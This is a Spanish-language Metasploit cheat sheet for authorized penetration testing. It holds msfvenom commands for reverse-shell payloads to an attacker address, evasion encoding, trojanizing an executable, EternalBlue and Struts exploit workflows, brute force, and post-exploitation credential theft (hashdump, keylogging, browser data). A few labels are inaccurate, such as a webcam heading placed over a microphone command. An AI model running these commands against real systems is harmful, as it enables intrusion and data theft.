# Metasploit Framework Cheat Sheet

## Overview

Metasploit Framework es una plataforma de pruebas de penetración de código abierto utilizada para:

- Descubrir servicios.
- Validar vulnerabilidades.
- Desarrollar y probar exploits.
- Realizar actividades post-explotación.
- Llevar a cabo evaluaciones de seguridad autorizadas.

Metasploit proporciona:

- Una gran base de datos de exploits.
- Generadores de payloads.
- Módulos post-explotación.
- Módulos auxiliares para escaneo y enumeración.
- Integración con otras herramientas.

```text
Usa Metasploit únicamente contra sistemas que poseas o tengas autorización explícita para testear.
```

---

# 1. Starting Metasploit

## Iniciar la consola de Metasploit

```bash
msfconsole
```

Esto lanza la interfaz de línea de comandos interactiva de Metasploit.

## Iniciar Metasploit y conectar a una base de datos existente

```bash
msfconsole
```

Metasploit se conecta automáticamente a la base de datos PostgreSQL si está en ejecución.

## Comprobar el estado de la base de datos

Desde dentro de `msfconsole`:

```bash
db_status
```

## Iniciar el servicio de base de datos (si no está en ejecución)

En muchos sistemas:

```bash
sudo systemctl start postgresql
sudo msfdb init
```

Luego reinicia `msfconsole`.

## Mostrar ayuda

```bash
help
```

## Salir de Metasploit

```bash
exit
```

o

```bash
quit
```

---

# 2. Workspace Management

Los workspaces te ayudan a organizar múltiples engagements.

## Listar workspaces

```bash
workspace
```

## Crear un nuevo workspace

```bash
workspace -a engagement_name
```

## Cambiar a un workspace

```bash
workspace engagement_name
```

## Eliminar un workspace

```bash
workspace -d engagement_name
```

## Renombrar un workspace

```bash
workspace -r old_name new_name
```

## Mostrar el workspace actual

```bash
workspace
```

---

# 3. Searching for Modules

Los módulos de Metasploit están organizados en categorías:

- `exploit`
- `payload`
- `auxiliary`
- `post`
- `encoder`
- `evasion`
- `nops`

## Buscar por palabra clave

```bash
search keyword
```

Ejemplo:

```bash
search smb
```

## Buscar por tipo de módulo

```bash
search type:exploit smb
```

## Buscar por plataforma

```bash
search platform:windows
```

## Buscar por CVE

```bash
search cve:2017-0144
```

## Buscar por puerto

```bash
search port:445
```

## Buscar por rank

Los ranks indican fiabilidad y seguridad:

- `manual`
- `low`
- `normal`
- `good`
- `great`
- `excellent`

```bash
search rank:excellent
```

## Combinar filtros de búsqueda

```bash
search type:exploit platform:windows port:445 rank:great
```

## Mostrar información detallada sobre un módulo

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

---

# 4. Using Modules

## Seleccionar un módulo

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Mostrar opciones del módulo

```bash
show options
```

## Mostrar opciones avanzadas

```bash
show advanced
```

## Mostrar opciones de evasión

```bash
show evasion
```

## Establecer una opción

```bash
set RHOSTS <target-IP>
```

## Establecer múltiples objetivos

```bash
set RHOSTS 192.168.1.10,192.168.1.20
```

## Establecer un rango de objetivos

```bash
set RHOSTS 192.168.1.10-20
```

## Establecer una subred

```bash
set RHOSTS 192.168.1.0/24
```

## Establecer la interfaz local

```bash
set LHOST 192.168.1.5
```

## Establecer el puerto de escucha

```bash
set LPORT 4444
```

## Establecer un payload para el exploit actual

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Resetear una opción a su valor por defecto

```bash
unset RHOSTS
```

## Resetear todas las opciones

```bash
unset *
```

## Ejecutar el módulo

```bash
run
```

o para exploits:

```bash
exploit
```

## Ejecutar el módulo en segundo plano

```bash
run -j
```

o

```bash
exploit -j
```

## Mostrar sesiones

```bash
sessions
```

## Interactuar con una sesión

```bash
sessions -i 1
```

## Eliminar una sesión

```bash
sessions -k 1
```

## Eliminar todas las sesiones

```bash
sessions -K
```

---

# 5. Payloads

## Listar payloads disponibles

```bash
show payloads
```

## Generar un payload con msfvenom

Fuera de `msfconsole`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

## Generar un payload para Linux

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
```

## Generar un payload PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.php
```

## Generar un payload Python

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.py
```

## Generar un payload PowerShell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f powershell -o payload.ps1
```

## Generar shellcode en hex

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c
```

## Codificar un payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Listar encoders

```bash
msfvenom --list encoders
```

## Listar formatos disponibles

```bash
msfvenom --list formats
```

## Generar un payload staged vs stageless

Staged (payload inicial más pequeño, descarga stages adicionales):

```bash
windows/meterpreter/reverse_tcp
```

Stageless (más grande, autocontenido):

```bash
windows/meterpreter_reverse_tcp
```

---

# 6. Auxiliary Modules

Los módulos auxiliares se usan para escaneo, enumeración, fuzzing y otras tareas no relacionadas con explotación.

## Buscar módulos auxiliares

```bash
search type:auxiliary smb
```

## Usar un escáner auxiliar

```bash
use auxiliary/scanner/smb/smb_version
```

## Establecer objetivo

```bash
set RHOSTS <target-IP>
```

## Ejecutar el escáner

```bash
run
```

## Escáneres auxiliares comunes

### Detección de versión SMB

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <target-IP>
run
```

### Enumeración de shares SMB

```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target-IP>
run
```

### Enumeración SSH

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target-IP>
run
```

### Escáner de directorios HTTP

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run
```

### Detección de versión HTTP

```bash
use auxiliary/scanner/http/http_version
set RHOSTS <target-IP>
run
```

### Escáner de puertos (TCP)

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-IP>
run
```

### Comprobación de login anónimo FTP

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target-IP>
run
```

### Enumeración de login MySQL

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-IP>
run
```

### Detección RDP

```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target-IP>
run
```

---

# 7. Exploitation Workflow

## Paso 1: Buscar un exploit

```bash
search ms17-010
```

## Paso 2: Seleccionar el exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Paso 3: Mostrar opciones

```bash
show options
```

## Paso 4: Establecer el objetivo

```bash
set RHOSTS <target-IP>
```

## Paso 5: Establecer el payload

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Paso 6: Establecer IP y puerto local

```bash
set LHOST 192.168.1.5
set LPORT 4444
```

## Paso 7: Comprobar si el objetivo es vulnerable (si está soportado)

```bash
check
```

No todos los módulos soportan el comando `check`.

## Paso 8: Ejecutar el exploit

```bash
exploit
```

## Paso 9: Interactuar con la sesión

```bash
sessions -i 1
```

---

# 8. Post-Exploitation with Meterpreter

Una vez tengas una sesión Meterpreter:

## Mostrar ayuda

```bash
help
```

## Mostrar información del sistema

```bash
sysinfo
```

## Mostrar usuario actual

```bash
getuid
```

## Mostrar procesos

```bash
ps
```

## Migrar a otro proceso

```bash
migrate <pid>
```

## Subir un archivo

```bash
upload local_path remote_path
```

## Descargar un archivo

```bash
download remote_path local_path
```

## Hacer una captura de pantalla

```bash
screenshot
```

## Grabar la webcam

```bash
record_mic
```

## Keylogging

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

## Hashdump (requiere privilegios)

```bash
run post/windows/gather/hashdump
```

## Enumerar usuarios locales

```bash
run post/windows/gather/enum_users
```

## Enumerar aplicaciones instaladas

```bash
run post/windows/gather/enum_applications
```

## Enumerar datos de Chrome

```bash
run post/windows/gather/enum_chrome
```

## Buscar archivos

```bash
search -f *.txt
```

## Buscar archivos específicos

```bash
search -f password
```

## Ejecutar un comando

```bash
shell
```

Volver a Meterpreter:

```bash
exit
```

## Ejecutar un único comando

```bash
execute -f cmd.exe -i
```

## Migrar sesión a un proceso más estable

```bash
migrate <pid>
```

## Poner la sesión en segundo plano

Presiona `Ctrl+Z` y confirma con `y`.

## Listar todas las sesiones

```bash
sessions
```

## Interactuar con una sesión específica

```bash
sessions -i <id>
```

## Eliminar una sesión

```bash
sessions -k <id>
```

---

# 9. Pivoting and Port Forwarding

## Añadir una ruta a través de un host comprometido

Desde `msfconsole`:

```bash
route add 10.10.10.0/24 1
```

Donde `1` es el ID de sesión.

## Mostrar rutas

```bash
route print
```

## Eliminar una ruta

```bash
route delete 10.10.10.0/24
```

## Usar una ruta con un módulo

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.20
set SESSION 1
run
```

## Port forwarding

Redirigir un puerto remoto a tu máquina local:

```bash
portfwd add -l 8080 -p 80 -r 10.10.10.20 -s 1
```

Esto redirige:

- Puerto local `8080`
- Al puerto remoto `80` en `10.10.10.20`
- A través de la sesión `1`

Acceso vía:

```text
http://127.0.0.1:8080
```

## Eliminar port forwarding

```bash
portfwd delete -l 8080
```

---

# 10. Database Integration

## Mostrar todos los hosts

```bash
hosts
```

## Mostrar todos los servicios

```bash
services
```

## Mostrar servicios para un host específico

```bash
services -H <target-IP>
```

## Mostrar servicios vulnerables

```bash
services -p 445
```

## Importar resultados de Nmap

```bash
db_import scan.xml
```

Los formatos soportados incluyen:

- Nmap XML.
- Nessus.
- Burp.
- Otros.

## Exportar datos de la base de datos

```bash
db_export /path/to/export
```

## Limpiar la base de datos

```bash
db_removeall
```

Usar con precaución.

---

# 11. Resource Scripts and Automation

## Ejecutar un script resource

```bash
resource /path/to/script.rc
```

## Crear un script resource simple

Ejemplo `auto_exploit.rc`:

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j
```

Ejecutarlo:

```bash
resource auto_exploit.rc
```

## Loggear todos los comandos y output

```bash
spool /path/to/logfile.txt
```

Detener el logging:

```bash
spool off
```

---

# 12. Encoding and Evasion

## Listar encoders disponibles

```bash
msfvenom --list encoders
```

## Codificar un payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Generar un payload con múltiples codificaciones

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o multi_encoded.exe
```

## Usar plantillas personalizadas

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x original.exe -f exe -o trojan.exe
```

Esto incrusta el payload en un ejecutable existente.

## Listar formatos disponibles

```bash
msfvenom --list formats
```

---

# 13. Common Exploits and Scenarios

## SMB EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## MS08-067 (NetAPI)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target-IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## Apache Struts RCE

```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS <target-IP>
set RPORT 8080
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## SSH Brute Force

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-IP>
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run
```

## FTP Brute Force

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-IP>
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

## HTTP Directory Bruteforce

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run
```

## VNC Scanner

```bash
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <target-IP>
run
```

---

# 14. Meterpreter Post Modules

## Migrar a un proceso estable

```bash
migrate <pid>
```

## Obtener información del sistema

```bash
sysinfo
```

## Obtener ID de usuario

```bash
getuid
```

## Comprobar si se ejecuta en una VM

```bash
run post/windows/gather/enum_vmware
```

## Enumerar usuarios locales

```bash
run post/windows/gather/enum_users
```

## Enumerar software instalado

```bash
run post/windows/gather/enum_applications
```

## Volcar hashes

```bash
run post/windows/gather/hashdump
```

## Enumerar Chrome

```bash
run post/windows/gather/enum_chrome
```

## Enumerar Firefox

```bash
run post/windows/gather/enum_firefox
```

## Buscar archivos interesantes

```bash
search -f *.docx
search -f *.pdf
search -f password
```

## Subir un archivo

```bash
upload /local/path/file.txt C:\\temp\\file.txt
```

## Descargar un archivo

```bash
download C:\\temp\\file.txt /local/path/
```

## Ejecutar un comando

```bash
shell
```

Volver a Meterpreter:

```bash
exit
```

## Ejecutar un único comando

```bash
execute -f cmd.exe -i
```

## Eliminar un proceso

```bash
kill <pid>
```

## Reiniciar el sistema

```bash
reboot
```

## Apagar el sistema

```bash
shutdown
```

---

# 15. Practical Workflows

## Flujo de trabajo básico de explotación

```text
1. Buscar un exploit.
2. Seleccionar el exploit.
3. Mostrar opciones.
4. Establecer RHOSTS, LHOST, LPORT.
5. Establecer el payload.
6. Ejecutar check (si está disponible).
7. Explotar.
8. Interactuar con la sesión.
9. Realizar post-explotación.
10. Documentar hallazgos.
```

## Ejemplo: Flujo de trabajo completo

```bash
# Iniciar Metasploit
msfconsole

# Buscar
search ms17-010

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Establecer opciones
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444

# Check
check

# Explotar
exploit

# Interactuar
sessions -i 1

# Post-explotación
sysinfo
getuid
run post/windows/gather/hashdump
```

## Enumeración de aplicaciones web

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run

use auxiliary/scanner/http/http_version
set RHOSTS <target-IP>
run

use auxiliary/scanner/http/title
set RHOSTS <target-IP>
run
```

## Enumeración de red

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.0/24
run
```

---

# 16. Common Commands Reference

| Command | Description |
|---|---|
| `msfconsole` | Iniciar la consola de Metasploit |
| `workspace` | Gestionar workspaces |
| `search` | Buscar módulos |
| `use` | Seleccionar un módulo |
| `show options` | Mostrar opciones del módulo |
| `set` | Establecer una opción |
| `unset` | Resetear una opción |
| `run` / `exploit` | Ejecutar un módulo |
| `check` | Comprobar si un objetivo es vulnerable |
| `sessions` | Listar sesiones |
| `sessions -i` | Interactuar con una sesión |
| `background` | Poner la sesión actual en segundo plano |
| `exit` / `quit` | Salir de Metasploit |
| `spool` | Loggear comandos y output |
| `resource` | Ejecutar un script resource |
| `db_import` | Importar resultados de escaneo |
| `hosts` | Listar hosts en la base de datos |
| `services` | Listar servicios en la base de datos |
| `route` | Gestionar rutas a través de hosts comprometidos |
| `portfwd` | Configurar port forwarding |
| `msfvenom` | Generar payloads |
| `help` | Mostrar ayuda |

---

# 17. Important Reminders

- Obtén siempre autorización explícita antes de usar Metasploit.
- Testea exploits primero en un entorno de laboratorio controlado.
- No todos los exploits son fiables; comprueba el rank.
- Algunos módulos pueden crashear servicios o sistemas.
- Mantén Metasploit actualizado regularmente.
- Valida los hallazgos manualmente; no confíes únicamente en resultados automatizados.
- Documenta todas las acciones, comandos y resultados.
- Preserva la evidencia original y los logs.
- Respeta el scope y las reglas del engagement.
- Entiende las implicaciones legales y éticas de tus acciones.

